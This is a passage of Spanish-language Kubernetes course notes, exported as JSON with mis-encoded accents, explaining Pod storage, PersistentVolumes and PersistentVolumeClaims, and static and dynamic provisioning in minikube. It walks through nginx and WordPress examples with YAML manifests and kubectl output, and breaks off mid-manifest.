en el fichero c√≥mo los datos de las variables de entorno del contenedor se inicializan con los valores que hemos creado en el ConfigMap y en el Secret anterior. Adem√°s, comprobamos que la variable de entorno WORDPRESS_DB_HOST se inicializa a mariadb-service, que es el nombre del Service creado para a acceder a mariaDB. Ejecutamos:\nkubectl apply -f wordpress-deployment.yaml\n\nLa definici√≥n del Service que vamos a crear la tenemos en el fichero: wordpress-srv.yaml. Como comprobamos en la definici√≥n estamos creando un Service del tipo NodePort, pero tambi√©n podr√≠amos haberlo configurado de tipo ClusterIP, porque posteriormente vamos a crear un recurso Ingress para acceder a la aplicaci√≥n. Ejecutamos:\nkubectl apply -f wordpress-srv.yaml\n\nAcceso a la aplicaci√≥n\nPara acceder a la aplicaci√≥n vamos a crear un recurso Ingress que tenemos definido en el fichero: wordpress-ingress.yaml. Como podemos observar vamos a usar el nombre www.miwordpress.org que tendremos que a√±adir en la resoluci√≥n est√°tica del ordenador desde el que vamos a acceder. Tambi√©n es interesante observar a que Service se va acceder con este recurso Ingress, el nombre del Service es wordpress-service que evidentemente es el mismo que hemos puesto en la definici√≥n del Service de Wordpress.\nUna vez que comprobemos que todos los recursos est√°n funcionando, podemos acceder a nuestra aplicaci√≥n:\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.0-almacenamiento-en-kubernetes":{"title":"8.0-almacenamiento-en-kubernetes","links":[],"tags":[],"content":"8. Almacenamiento en Kubernetes\nYa lo hemos comentando en anteriores m√≥dulos, pero es importante tener en cuenta que los Pods son ef√≠meros, es decir, cuando un Pod se elimina se pierde toda la informaci√≥n que ten√≠a. Evidentemente, cuando creamos un nuevo Pod no contendr√° ninguna informaci√≥n adicional a la propia aplicaci√≥n.\nPodemos fijarnos en el Ejemplo: Despliegue y acceso a Wordpress + MariaDB (que vestudiamos en el m√≥dulo anterior), y responder las siguientes preguntas:\n\n\n¬øQu√© pasa si eliminamos el despliegue de mariadb?, o, ¬øse elimina el Pod de mariadb y se crea uno nuevo?\nEvidentemente, toda la informaci√≥n guardada en la base de datos se perder√°, por lo que al iniciar un nuevo despliegue, no tendremos informaci√≥n guardada, habremos perdido todo el contenido de nuestra aplicaci√≥n y empezar√≠a de nuevo el proceso de instalaci√≥n.\n\n\n¬øQu√© pasa si escalamos el despliegue de la base de datos y tenemos dos Pods ofreciendo la base de datos?\nEn este caso el Pod m√°s antiguo tendr√≠a la informaci√≥n de la base de datos, pero el nuevo Pod creado al escalar el despliegue no tendr√≠a ninguna informaci√≥n. Como al acceder al Service de la base de datos se hace balanceo de carga, en unas ocasiones acceder√≠amos al Pod antiguo, y todo funcionar√≠a correctamente, pero cuando acceder√≠amos al Pod nuevo, al no tener informaci√≥n, nos mostrar√≠a la pantalla de instalaci√≥n de la aplicaci√≥n. En definitiva, tendr√≠amos dos bases de datos distintas a las que acceder√≠amos indistintamente.\n\n\nSi escribimos un post en el Wordpress y subimos una imagen, ¬øqu√© pasa con esta informaci√≥n en el Pod?\nEst√° claro que cuando escribimos un post esa informaci√≥n se guarda en la base de datos. Pero la imagen que hemos subido al post se guardar√≠a en un directorio del servidor web (del Pod de Wordpress). Tendr√≠amos los mismos problemas que con la base de datos, si eliminamos este Pod se perder√° todo el contenido est√°tico de nuestro Wordpress.\n\n\n¬øQu√© pasa si escalamos el despliegue de Wordpress a dos Pods?\nPues la respuesta es similar a la anterior. En este caso, el Pod antiguo tendr√≠a almacenada el contenido est√°tico (la imagen), pero el nuevo no tendr√≠a esa informaci√≥n. Como al acceder a la aplicaci√≥n se balancea la carga, se mostrar√≠a la imagen diferente en funci√≥n del Pod que estuvi√©ramos accediendo.\n\n\nPor lo tanto, es necesario usar un mecanismo que nos permita guardar la informaci√≥n con la que trabajan los Pods para que no se pierda en caso de que el Pod se elimine. Al sistema de almacenamiento persistente que nos ofrece Kubernetes lo llamamos vol√∫menes. Con el uso de dichos vol√∫menes vamos a conseguir varias cosas:\n\nSi un Pod guarda su informaci√≥n en un volumen, est√° no se perder√°. Por lo que podemos eliminar el Pod sin ning√∫n problema y cuando volvamos a crearlo mantendr√° la misma informaci√≥n. En definitiva, los vol√∫menes proporcionan almacenamiento adicional o secundario al disco que define la imagen.\nSi usamos vol√∫menes, y tenemos varios Pods que est√°n ofreciendo un servicio, estos Pods tendr√°n la informaci√≥n compartida y por tanto todos podr√°n leer y escribir la misma informaci√≥n.\nTambi√©n podemos usar los vol√∫menes dentro de un Pod, para que los contenedores que forman parte de √©l puedan compartir informaci√≥n.\n\nPor √∫ltimo, indicar que vamos a tener a nuestra disposici√≥n distintos tipos de vol√∫menes para usar. Hay que tener en cuenta que si nuestro cluster tiene varios nodos y los Pods de una aplicaci√≥n se reparten por estos nodos, necesitamos sistemas de almacenamiento que nos posibiliten compartir la informaci√≥n entre los nodos del cluster. Como en este curso estamos usando minikube, nuestro cluster tiene un solo nodo, por lo que vamos a usar un tipo de almacenamiento que permita compartir la informaci√≥n dentro de este nodo (por ejemplo un directorio en el sistema de archivos del nodo), por lo tanto este tema lo vamos a simplificar al no tener la posibilidad de tener un cluster con varios nodos."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.1-volumenes-en-kubernetes":{"title":"8.1-volumenes-en-kubernetes","links":[],"tags":[],"content":"8.1 Vol√∫menes en Kubernetes\nTipos de vol√∫menes\nLos vol√∫menes nos permiten proporcional almacenamiento a los Pods, y podemos usar distintos tipos que nos ofrecen distintas caracter√≠sticas:\n\nProporcionados por proveedores de cloud: AWS, Azure, GCE, OpenStack, etc\nPropios de Kubernetes:\n\nconfigMap: Para usar un configMap como un directorio desde el Pod.\nemptyDir: Volumen ef√≠mero con la misma vida que el Pod. Usado como almacenamiento secundario o para compartir entre contenedores del mismo Pod.\nhostPath: Monta un directorio del host en el Pod (usado excepcionalmente, pero es el que nosotros vamos a usar con minikube).\n‚Ä¶\n\n\nHabituales en despliegues ‚Äúon premises‚Äù: glusterfs, cephfs, iscsi, nfs, etc.\n\nTrabajando con vol√∫menes\nAl trabajar con vol√∫menes en Kubernetes se realizan dos funciones claramente diferenciadas:\n\n\nDesde el punto de vista del administrador del cluster de Kubernetes:\nEl administrador es el responsable de la gesti√≥n del almacenamiento en el cl√∫ster de k8s. Proporciona almacenamiento a las aplicaciones, entrando a detalle en configurar los diferentes mecanismo, bien proporcionados por el proveedor de cloud o configurados directamente. Para ello gestiona los recursos del cluster llamados PersistentVolume o StorageClasses. Ejemplos:\n\nConfigurar Azure Disk para que pueda usarlo k8s.\nConfigurar Cephfs o RBD en la red local para usarlo en k8s.\n\n\n\nDesde el punto de vista del desarrollador de aplicaciones que van a ser ejecutadas en el cluster de Kubernetes:\nA los desarrolladores de aplicaciones les interesa m√°s la disponibilidad y las caracter√≠sticas del almacenamiento que los detalles sobre el mecanismo de almacenamiento. Para solicitar almacenamiento se va a utilizar el recurso del cluster PersistentVolumeClaim. Ejemplos:\n\nQuiero 20 GiB de almacenamiento permanente que pueda compartir entre varios Pods de varios nodos en modo lectura.\nQuiero 10 GiB de almacenamiento provisional para usar desde un Pod en modo lectura y escritura.\n\n\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.2-aprovisionamiento-de-volumenes":{"title":"8.2-aprovisionamiento-de-volumenes","links":[],"tags":[],"content":"8.2 Aprovisionamiento de vol√∫menes\nPara que el administrador de Kubernetes defina los vol√∫menes disponibles en nuestro cluster tenemos dos posibilidades:\n\nAprovisionamiento est√°tico\nEn este caso, es el administrador del cluster el responsable de ir definiendo los distintos vol√∫menes disponibles en el cluster creando manualmente los distintos recursos PersistentVolumen (PV).\nUn PersistentVolumen es un objeto que representa los vol√∫menes disponibles en el cluster. En √©l se van a definir los detalles del backend de almacenamiento que vamos a utilizar, el tama√±o disponible, los modos de acceso, las pol√≠ticas de reciclaje, etc.\nTenemos tres modos de acceso, que dependen del backend que vamos a utilizar:\n\nReadWriteOnce: read-write solo para un nodo (RWO)\nReadOnlyMany: read-only para muchos nodos (ROX)\nReadWriteMany: read-write para muchos nodos (RWX)\n\nLas pol√≠ticas de reciclaje de vol√∫menes tambi√©n dependen del backend y son:\n\nRetain: El PV no se elimina, aunque el PVC se elimine. El administrador debe borrar el contenido para la pr√≥xima asociaci√≥n.\nRecycle: Reutilizar contenido. Se elimina el contenido y el volumen es de nuevo utilizable.\nDelete: Se borra despu√©s de su utilizaci√≥n.\n\nA modo de resumen, ponemos en la siguiente tabla los modos de acceso de algunos de los sistemas de almacenamiento m√°s usados:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPluginReadWriteOnceReadOnlyManyReadWriteManyAWS EBS‚úì--AzureFile‚úì‚úì‚úìAzureDisk‚úì--CephFS‚úì‚úì‚úìCinder‚úì--GCEPersistentDisk‚úì‚úì-Glusterfs‚úì‚úì‚úìHostPath‚úì--iSCSI‚úì‚úì-NFS‚úì‚úì‚úìRBD‚úì‚úì-\nPor √∫ltimo, vemos un ejemplo de un fichero yaml que nos permite la definici√≥n de un PersitentVolumen:\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv1\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 5Gi\n  accessModes:\n    - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Recycle\n  hostPath:\n    path: /data/pv1\n\n\nstorageClassName: manual: Indica que este volumen se puede asignar de forma est√°tica, sin utilizar ning√∫n ‚Äúaprovisonador‚Äù de almacenamiento.\nSe indica al tama√±o del volumen, con capacity, storage.\naccessModes: El modo de acceso.\npersistentVolumeReclaimPolicy: La pol√≠tica de reciclaje.\nY por √∫timo se indica el tipo (backend) de almacenamiento, en este caso es de tipo hostPath que crear√° un directorio (/data/pv1) en el nodo para guardar la informaci√≥n.\n\nAprovisionamiento din√°mico\nCuando el desarrollador necesita almacenamiento para su aplicaci√≥n, hace una petici√≥n de almacenamiento creando un recurso PersistentVolumenClaim (PVC) y de forma din√°mica se crea el recurso PersistentVolume que representa el volumen y se asocia con esa petici√≥n. De otra forma explicado, cada vez que se cree un PersistentVolumenClaim, se crear√° bajo demanda un PersistentVolumen que se ajuste a las caracter√≠sticas seleccionadas.\nPara conseguir la gesti√≥n din√°mica de vol√∫menes, necesitamos un ‚Äúaprovisionador‚Äù de almacenamiento (tendremos distintos aprovisionadores para los distintos tipos de almacenamiento).\nPara definir los ‚Äúaprovisionadores‚Äù de almacenamiento, usaremos el objeto StorageClass. En Minikube, por defecto, ya tenemos un provisionador para almacenamiento del tipo hostPath (monta un directorio del host en el pod).\nkubectl get storageclass\nNAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\nstandard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  46d\n\nEn este caso la configuraci√≥n del objeto storageclass se defini√≥ con las siguientes caracter√≠sticas:\n\nLa pol√≠tica de reciclaje tiene el valor Delete.\nY el modo de asociaci√≥n (VOLUMEBINDINGMODE) tiene el valor Immediate, es decir, cuando se cree el objeto PersistenVolumenClaim se asociar√° de forma din√°mica un volumen (objeto PersistenVolumen) inmediatamente. Otro valor podr√≠a ser WaitForFirstConsumer, en ese caso la asociaci√≥n se har√≠a cuando se utilizar√° el volumen.\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.3-solicitud-de-volumenes":{"title":"8.3-solicitud-de-volumenes","links":[],"tags":[],"content":"8.3 Solicitud de vol√∫menes\nIndependientemente de c√≥mo haya aprovisionado el almacenamiento el administrador del cluster (de forma din√°mica o de forma est√°tica), el desarrollador debe hacer una solicitud de almacenamiento, indicando las caracter√≠sticas del volumen que necesita.\nUn desarrollador no necesita conocer los distintos tipos de vol√∫menes disponibles en el cluster. ¬°Son detalles muy espec√≠ficos!\nUn desarrollador se centra en indicar los requerimientos que debe tener el volumen que necesita:\n\nTama√±o.\nTipo de acceso (s√≥lo lectura o lectura / escritura).\nTipo de volumen (s√≥lo si es importante).\n\nPara hacer la solicitud de un volumen, el desarrollador debe crear un recurso en el cluster llamado PersitentVolumenClaim, veamos un ejemplo:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc1\nspec:\n  storageClassName: manual\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nEn esta solicitud el desarrollador indica los requisitos que necesita para su almacenamiento:\n\nstorageClassName: manual: Con esto indicamos que no se use ning√∫n aprovisionador din√°mico. Si no pongo esta l√≠nea se intentaran asociar un volumen de forma din√°mica.\naccessModes: El tipo de acceso que necesita.\nY el tama√±o que necesita en resources, requests, storage.\n\nUna vez que se crea este recurso, el cluster intentar√° asignar un volumen (ya sea de forma est√°tica o din√°mica) que cumpla con los requisitos indicados."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.4-uso-de-volumenes":{"title":"8.4-uso-de-volumenes","links":[],"tags":[],"content":"8.4 Uso de vol√∫menes\nUna vez que hemos solicitado el almacenamiento, y se ha asignado un volumen (ya sea de forma din√°mica o est√°tica), vamos a definir el uso que se va a hacer de este volumen.\nComo ejemplo, vamos a definir un Pod que utilice dicho volumen, para ello vamos a crear un fichero yaml con la siguiente definici√≥n:\nkind: Pod\napiVersion: v1\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n    - name: task-pv-storage\n      persistentVolumeClaim:\n       claimName: pvc1\n  containers:\n    - name: task-pv-container\n      image: nginx\n      ports:\n        - containerPort: 80\n          name: &quot;http-server&quot;\n      volumeMounts:\n        - mountPath: &quot;/usr/share/nginx/html&quot;\n          name: task-pv-storage\n\n\nEn la especificaci√≥n de este Pod, adem√°s de indicar el contenedor, hemos indicado que va a tener un volumen (campo volumes).\nEn realidad definimos una lista de vol√∫menes (en este caso solo definimos uno) indicando su nombre (name) y la solicitud del volumen (persistentVolumeClaim, claimName).\nAdem√°s en la definici√≥n del contenedor tendremos que indicar el punto de montaje del volumen (volumeMounts) se√±alando el directorio del contenedor (mountPath) y el nombre (name).\n\nCuando el Pod termina, el pvc mantiene el volumen reservado (bound). Es necesario que se borre expl√≠citamente el pvc para liberarlo.\nLa recuperaci√≥n del volumen depender√° de la pol√≠tica de reciclaje que tuviera asignada."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-1-gestion-estatica-de-volumenes":{"title":"ejemplo-1-gestion-estatica-de-volumenes","links":[],"tags":[],"content":"Ejemplo 1: Gesti√≥n est√°tica de vol√∫menes\nOcultar\nEn este ejemplo vamos a desplegar un servidor web que va a servir una p√°gina html que tendr√° almacenada en un volumen. En este primer ejemplo, la asignaci√≥n del volumen se va a realizar de forma est√°tica.\nAprovisonamiento del volumen\nEn este caso, ser√° el administrador del cluster el responsable de dar de alta en el cluster los vol√∫menes disponibles. Como hemos estudiado anteriormente, indicaremos algunas caracter√≠sticas del volumen: la capacidad, el modo de acceso, la pol√≠tica de reciclaje, el tipo de volumen,‚Ä¶\nPara ello vamos a describir el objeto PersistentVolume en el fichero pv-ejemplo1.yaml:\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv-ejemplo1\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 5Gi\n  accessModes:\n    - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Recycle\n  hostPath:\n    path: /data/pv-ejemplo1\n\nNota\nOcultar\nNota: como estamos utilizando minikube, y nuestro cluster est√° formado por un s√≥lo nodo, el tipo de almacenamiento m√°s simple que podemos usar es hostPath, que crear√° un directorio en el nodo (/data/pv-ejemplo1) que ser√° el que se monte en el Pod para guardar la informaci√≥n.\nOcultar\nEl administrador crea el volumen:\nkubectl apply -f pv-ejemplo1.yaml\n\nPodemos ver los vol√∫menes que tenemos disponibles en el cluster:\nkubectl get pv\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Available           manual                  73s\n\nNos fijamos que el estado del volumen es Available, todav√≠a no se ha asociado con ninguna solicitud de volumen.\nY podemos obtener los detalle de este recurso:\nkubectl describe pv pv-ejemplo1\n\nSolicitud del volumen\nA continuaci√≥n, nosotros como desarrolladores necesitamos solicitar un volumen con ciertas caracter√≠sticas para nuestra aplicaci√≥n, para ello vamos a definir un objeto PersistentVolumeClaim, que definiremos en el fichero pvc-ejemplo1.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc-ejemplo1\nspec:\n  storageClassName: manual\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nComo vemos, desde el punto de vista del desarrollador no se necesita saber los tipos de vol√∫menes que tenemos disponibles, simplemente indicamos que queremos un 1Gb de almacenamiento, el tipo de acceso y que se haga la asignaci√≥n de forma est√°tica (storageClassName: manual).\nCuando creemos el objeto PersistentVolumeClaim podremos comprobar si hay alg√∫n volumen (PersistentVolume) disponible en el cluster que cumpla con los requisitos:\nkubectl apply -f pvc-ejemplo1.yaml\n\nkubectl get pv,pvc\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Bound    default/pvc-ejemplo1   manual                  2m1s\n\nNAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/pvc-ejemplo1   Bound    pv-ejemplo1   5Gi        RWX            manual         3s\n\nPodemos apreciar que el el estado del volumen ha cambiado a Bound que significa que ya est√° asociado al PersistentVolumeClaim que hemos creado.\nNota\nOcultar\nNota: El desarrollador quer√≠a 1 Gb de disco, demanda que se cumple de sobra con los 5 Gb del volumen que se ha asociado.\nOcultar\nUso del volumen\nUna vez que tenemos un volumen a nuestra disposici√≥n, vamos a crear un despliegue de un servidor web, indicando en la especificaci√≥n del Pod, que estar√° formado por el volumen y el directorio donde vamos a montarlo. Para ello vamos a usar el fichero deploy-ejemplo1.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ejemplo1\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      volumes:\n        - name: volumen-ejemplo1\n          persistentVolumeClaim:\n            claimName: pvc-ejemplo1\n      containers:\n        - name: contenedor-nginx\n          image: nginx\n          ports:\n            - name: http-server\n              containerPort: 80\n          volumeMounts:\n            - mountPath: &quot;/usr/share/nginx/html&quot;\n              name: volumen-ejemplo1\n\nPodemos observar que en la especificaci√≥n del Pod hemos indicado que estar√° formado por un volumen correspondiente al asignado al PersistentVolumeClaim pvc-ejemplo1 y que el contenedor tendr√° en el volumen un punto de montaje en el directorio DocumentRoot de nginx (/usr/share/nginx/html) .\nCreamos el Deployment:\nkubectl apply -f deploy-ejemplo1.yaml\n\nY a continuaci√≥n, cuando el contenedor est√© funcionando:\nkubectl get all\n...\nNAME                                  READY   STATUS    RESTARTS   AGE\npod/nginx-ejemplo1-86864d84b5-s62dq   1/1     Running   0          6s\n...\n\nVamos a ejecutar un comando en el Pod para que se cree un fichero index.html en el directorio /usr/share/nginx/html (evidentemente estaremos guardando ese fichero en el volumen).\nkubectl exec pod/nginx-ejemplo1-86864d84b5-s62dq -- bash -c &quot;echo &#039;&lt;h1&gt;Almacenamiento en K8S&lt;/h1&gt;&#039; &gt; /usr/share/nginx/html/index.html&quot;\n\nFinalmente creamos el Service de acceso al despliegue, usando el fichero srv-ejemplo1.yaml.\nkubectl apply -f srv-ejemplo1.yaml\n\nkubectl get all\n...\nservice/nginx-ejemplo1   NodePort    10.106.238.146   &lt;none&gt;        80:32581/TCP   13s\n...\n\nY accedemos a la aplicaci√≥n, accediendo a la ip del nodo controlador del cluster y al puerto asignado al Service NodePort:\nminikube ip\n192.168.39.222\n\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\n\nComprobemos la persistencia de la informaci√≥n\nEn primer lugar podemos acceder al nodo del cluster y comprobar que en el directorio que indicamos en la creaci√≥n del volumen, efectivamente existe el fichero index.html:\nminikube ssh\nls /data/pv-ejemplo1\nindex.html\n\nEn segundo lugar podemos hacer la prueba de eliminar el despliegue, volver a crearlo y volver a acceder a la aplicaci√≥n para comprobar que el servidor web sigue sirviendo el mismo fichero index.html:\nkubectl delete -f deploy-ejemplo1.yaml\nkubectl apply -f deploy-ejemplo1.yaml\n\nY volvemos acceder al mismo puerto:\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\n\nEliminaci√≥n del volumen\nSi finalmente queremos eliminar los vol√∫menes creados, tendremos que eliminar la solicitud, el objeto PersistentVolumeClaim, y dependiendo de la pol√≠tica de reciclaje con la que creamos el objeto PersistentVolume tendremos distintos comportamientos.\nEn este caso, como la pol√≠tica de reciclaje con la que creamos el volumen es Recycle, no se eliminar√° pero se borrar√° su contenido y el volumen se podr√° reutilizar, es decir su estado volver√° a Available:\nkubectl delete persistentvolumeclaim/pvc-ejemplo1\n\nkubectl get pv,pvc\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Available           manual                  8m8s\n\nSi queremos eliminar el objeto PersistentVolume, ejecutamos:\nkubectl delete persistentvolume/pv-ejemplo1\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-2-gestion-dinamica-de-volumenes":{"title":"ejemplo-2-gestion-dinamica-de-volumenes","links":[],"tags":[],"content":"Ejemplo 2: Gesti√≥n din√°mica de vol√∫menes\nOcultar\nEn este ejemplo vamos a desplegar un servidor web que va a servir una p√°gina html que tendr√° almacenada en un volumen. En esta ocasi√≥n, la asignaci√≥n del volumen se va a realizar de forma din√°mica.\nAprovisonamiento del volumen\nPara que la asignaci√≥n del volumen (objeto PersitentVolume) se haga de forma din√°mica al crear la solicitud (objeto PersitentVolumeClaim) es necesario tener configurado un aprovisonador de almacenamiento que se define en un objeto StorageClass. Como vimos en minikube tenemos configurado un aprovisonador para vol√∫menes de tipo hostPath:\nkubectl get storageclass\nNAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\nstandard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  46d\n\nDe tal manera que cuando creemos una solicitud de volumen (objeto PersitentVolumeClaim) se creara de forma din√°mica un objeto PersitentVolume, que se asociar√≠a a la solicitud.\nSolicitud del volumen\nVamos a realizar la solicitud de volumen, en este caso usaremos el fichero pvc-ejemplo2.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc-ejemplo2\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nNota\nOcultar\nNota: F√≠jate que esta definici√≥n hemos quitado la declaraci√≥n storageClassName: manual. Al no ponerla se elegir√° el storageclass por defecto, cuya definici√≥n hemos visto anteriormente en minikube y que en este caso se llama standard.\nOcultar\nCuando creemos el objeto PersistentVolumeClaim, veremos que de forma din√°mica se crear√° un PersitentVolumen que se asociar√° a nuestra solicitud::\nkubectl apply -f pvc-ejemplo2.yaml\n\nkubectl get pv,pvc\nNAME                                                        CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE\npersistentvolume/pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36   1Gi        RWX            Delete           Bound    default/pvc-ejemplo2   standard                1s\n\nNAME                                 STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/pvc-ejemplo2   Bound    pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36   1Gi        RWX            standard       1s\n\n\nNota\nOcultar\nNota: En este caso, como el volumen se ha generado din√°micamente, su capacidad es igual a la solicitada, 1 Gb.\nOcultar\nComo el volumen ha sido generado de forma din√°mica por el aprovisonador, √©ste habr√° escogido una carpeta del host que corresponda al volumen.\nkubectl describe persistentvolume/pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36\n...\nSource:\n    Type:          HostPath (bare host directory volume)\n    Path:          /tmp/hostpath-provisioner/default/pvc-ejemplo2\n...\n\nUso del volumen\nA partir de este punto el ejercicio es muy parecido al que vimos en el ejemplo1.\nCreamos el Deployment usando el fichero deploy-ejemplo2.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ejemplo2\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      volumes:\n        - name: volumen-ejemplo2\n          persistentVolumeClaim:\n            claimName: pvc-ejemplo2\n      containers:\n        - name: contenedor-nginx\n          image: nginx\n          ports:\n            - name: http-server\n              containerPort: 80\n          volumeMounts:\n            - mountPath: &quot;/usr/share/nginx/html&quot;\n              name: volumen-ejemplo2\n\nCreamos el Deployment:\nkubectl apply -f deploy-ejemplo2.yaml\n\nY a continuaci√≥n, cuando el contenedor est√© funcionando, creamos el fichero index.html:\nkubectl get all\n...\nNAME                                 READY   STATUS    RESTARTS   AGE\npod/nginx-ejemplo2-7b79b5966-zbdqh   1/1     Running   0          5s\n...\nkubectl exec pod/nginx-ejemplo2-7b79b5966-zbdqh -- bash -c &quot;echo &#039;&lt;h1&gt;Almacenamiento en K8S&lt;/h1&gt;&#039; &gt; /usr/share/nginx/html/index.html&quot;\n\nFinalmente creamos el Service de acceso al despliegue, usando el fichero srv-ejemplo2.yaml.\nkubectl apply -f srv-ejemplo2.yaml\n\nkubectl get all\n...\nservice/nginx-ejemplo2   NodePort    10.99.48.24   &lt;none&gt;        80:31053/TCP   3s\n...\n\nY accedemos a la aplicaci√≥n accediendo a la ip del nodo controlador del cluster y al puerto asignado al Service NodePort:\nminikube ip\n192.168.39.222\n\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\nFinalmente puedes volver a comprobar que la informaci√≥n de la aplicaci√≥n no se pierde borrando el Deployment y volvi√©ndolo a crear, comprobando que se sigue sirviendo el fichero index.html.\nEliminaci√≥n del volumen\nEn este caso, los vol√∫menes que crea de forma din√°mica el storageclass que tenemos creado en minikube, tienen como pol√≠tica de reciclaje el valor de Delete. Esto significa que cuando eliminemos la solicitud, el objeto PersistentVolumeClaim, tambi√©n se borrar√° el volumen, el objeto PersistentVolume.\nkubectl delete persistentvolumeclaim/pvc-ejemplo2\n\nkubectl get pv,pvc\nNo resources found\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-3-wordpress-con-almacenamiento-persistente":{"title":"ejemplo-3-wordpress-con-almacenamiento-persistente","links":[],"tags":[],"content":"Ejemplo 3: Wordpress con almacenamiento persistente\nOcultar\nEn este ejemplo vamos a volver e realizar el Ejemplo completo: Despliegue y acceso a Wordpress + MariaDB del m√≥dulo anterior, pero a√±adiendo el almacenamiento necesario para que la aplicaci√≥n sea persistente.\nPara llevar a cabo esta tarea necesitaremos tener a nuestra disposici√≥n dos vol√∫menes:\n\nUno para guardar la informaci√≥n de Wordpress.\nOtro para guardar la informaci√≥n de MariaDB.\n\nPara este ejercicio utilizaremos asignaci√≥n din√°mica de vol√∫menes.\nCreaci√≥n de los vol√∫menes necesarios\nComo hemos comentado vamos a usar la asignaci√≥n din√°mica de vol√∫menes, por lo tanto tendremos que crear dos objetos PersistentVolumenClaim para solicitar los dos vol√∫menes.\nPara solicitar el volumen para la aplicaci√≥n Wordpress usaremos el fichero wordpress-pvc.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: wordpress-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n\nY para solicitar el volumen para la base de datos usaremos un fichero similar: mariadb-pvc.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: mariadb-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n\nCreamos las solicitudes y comprobamos que se ha asociado un volumen a cada una de ellas:\nkubectl apply -f wordpress-pvc.yaml\nkubectl apply -f mariadb-pvc.yaml\n\nkubectl get pv,pvc\nNAME                                                        CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                   STORAGECLASS   REASON   AGE\npersistentvolume/pvc-01ed3c4c-a542-4161-93a9-b9d5ea2bf6d1   5Gi        RWX            Delete           Bound    default/wordpress-pvc   standard                10s\npersistentvolume/pvc-78acc14b-71da-4cf0-861d-0ab7780bca4f   5Gi        RWX            Delete           Bound    default/mariadb-pvc     standard                10s\n\nNAME                                  STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/mariadb-pvc     Bound    pvc-78acc14b-71da-4cf0-861d-0ab7780bca4f   5Gi        RWX            standard       10s\npersistentvolumeclaim/wordpress-pvc   Bound    pvc-01ed3c4c-a542-4161-93a9-b9d5ea2bf6d1   5Gi        RWX            standard       10s\n\n\nModificaci√≥n de los Deployments para el uso de los vol√∫menes\nA continuaci√≥n vamos a modificar el fichero wordpress-deployment.yaml para a√±adir el volumen al Pod y el punto de montaje:\n...\n    spec:\n      containers:\n      ...\n          volumeMounts:\n            - name: 